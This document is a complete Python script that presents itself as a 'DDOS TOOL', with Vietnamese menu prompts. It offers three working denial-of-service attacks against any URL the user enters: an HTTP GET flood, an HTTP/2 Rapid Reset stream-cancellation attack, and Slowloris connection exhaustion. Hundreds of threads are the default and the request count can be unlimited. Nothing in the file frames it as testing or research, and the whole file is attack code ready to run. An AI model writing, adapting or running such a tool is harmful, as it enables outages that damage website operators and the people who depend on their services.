#!/usr/bin/env python3
# usage: python3 ddos.py
import asyncio, aiohttp, time, random, sys, os, threading, socket, ssl

counter = 0
running = False
lock = asyncio.Lock()
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print("=" * 50)
    print("  DDOS TOOL  —  Codespaces Edition")
    print("=" * 50)

def menu():
    banner()
    print("  [1] HTTP Flood")
    print("  [2] Rapid Reset (HTTP/2)")
    print("  [3] Slowloris")
    print("  [0] Thoat")
    print("=" * 50)
    return input("  Chon: ").strip()

def ask():
    url = input("  URL (https://web-can-ddos): ").strip()
    if not url:
        return None, None, None
    try:
        threads = int(input("  Luong (threads, vd 500): ").strip() or "500")
        reqs = int(input("  Request (tong so, 0 = vo han): ").strip() or "0")
    except ValueError:
        threads, reqs = 500, 0
    return url, threads, reqs

# ---------- HTTP Flood ----------
async def http_worker(url, sem, timeout, max_req):
    global counter
    headers = {"User-Agent": random.choice(UA), "Accept": "*/*", "Connection": "keep-alive"}
    conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, force_close=False)
    async with sem:
        async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=timeout)) as s:
            while running:
                if max_req and counter >= max_req:
                    return
                try:
                    async with s.get(url, headers=headers, ssl=False) as r:
                        await r.read()
                    async with lock:
                        counter += 1
                except Exception:
                    pass

async def http_stats(start, max_req):
    while running:
        await asyncio.sleep(1)
        async with lock:
            c = counter
        el = time.time() - start
        print(f"\r  [{el:6.1f}s] req={c}" + (f"/{max_req}" if max_req else "") + f"  rps={c/el:7.1f}", end="", flush=True)

async def http_flood(url, threads, max_req):
    global counter, running
    counter = 0
    running = True
    sem = asyncio.Semaphore(threads)
    start = time.time()
    stats_task = asyncio.create_task(http_stats(start, max_req))
    await asyncio.gather(*[asyncio.create_task(http_worker(url, sem, 5.0, max_req)) for _ in range(threads)])
    running = False
    await stats_task
    print("\n  Xong.")

# ---------- Rapid Reset ----------
def rr_worker(host, port, path):
    from h2.connection import H2Connection
    from h2.config import H2Configuration
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    while running:
        try:
            s = socket.create_connection((host, port), timeout=5)
            s = ctx.wrap_socket(s, server_hostname=host)
            cfg = H2Configuration(client_side=True, header_encoding="utf-8")
            conn = H2Connection(config=cfg)
            conn.initiate_connection()
            s.sendall(conn.data_to_send())
            sid = conn.get_next_available_stream_id()
            conn.send_headers(sid, [
                (":method", "GET"), (":path", path), (":scheme", "https"),
                (":authority", host), ("user-agent", random.choice(UA)),
            ])
            s.sendall(conn.data_to_send())
            conn.reset_stream(sid, error_code=0x8)
            s.sendall(conn.data_to_send())
            s.close()
        except Exception:
            pass

def rapid_reset(url, threads, max_req):
    global counter, running
    counter = 0
    running = True
    host = url.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    path = "/" + "/".join(url.split("/")[3:]) if len(url.split("/")) > 3 else "/"
    port = 443
    def run():
        while running:
            try: rr_worker(host, port, path)
            except Exception: pass
    for _ in range(threads):
        threading.Thread(target=run, daemon=True).start()
    start = time.time()
    try:
        while running:
            time.sleep(1)
            el = time.time() - start
            print(f"\r  [{el:6.1f}s] luong={threads}  dang chay...", end="", flush=True)
    except KeyboardInterrupt:
        running = False
    print("\n  Xong.")

# ---------- Slowloris ----------
def slow_worker(host, port, n):
    socks = []
    def init():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {host}\r\n".encode())
        s.send(b"User-Agent: Mozilla/5.0\r\n")
        s.send(b"Accept-language: en-US,en\r\n")
        return s
    for _ in range(n):
        try: socks.append(init())
        except Exception: pass
    while running:
        for s in list(socks):
            try: s.send(b"X-a: b\r\n")
            except Exception:
                socks.remove(s)
                try: socks.append(init())
                except Exception: pass
        time.sleep(10)

def slowloris(url, threads, max_req):
    global counter, running
    running = True
    host = url.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    port = 80
    threading.Thread(target=slow_worker, args=(host, port, threads), daemon=True).start()
    start = time.time()
    try:
        while running:
            time.sleep(1)
            el = time.time() - start
            print(f"\r  [{el:6.1f}s] socket={threads}  dang giu ket noi...", end="", flush=True)
    except KeyboardInterrupt:
        running = False
    print("\n  Xong.")

def main():
    while True:
        c = menu()
        if c == "0":
            print("  Bye.")
            sys.exit(0)
        if c not in ("1", "2", "3"):
            continue
        url, threads, reqs = ask()
        if not url:
            continue
        if not url.startswith("http"):
            url = "https://" + url
        print(f"\n  Target: {url}")
        print(f"  Luong : {threads}")
        print(f"  Req   : {'vo han' if reqs == 0 else reqs}")
        input("  Enter de bat dau (Ctrl+C de dung)...")
        try:
            if c == "1":
                asyncio.run(http_flood(url, threads, reqs))
            elif c == "2":
                rapid_reset(url, threads, reqs)
            elif c == "3":
                slowloris(url, threads, reqs)
        except KeyboardInterrupt:
            global running
            running = False
            print("\n  Da dung.")
        input("  Enter de quay lai menu...")

if __name__ == "__main__":
    main()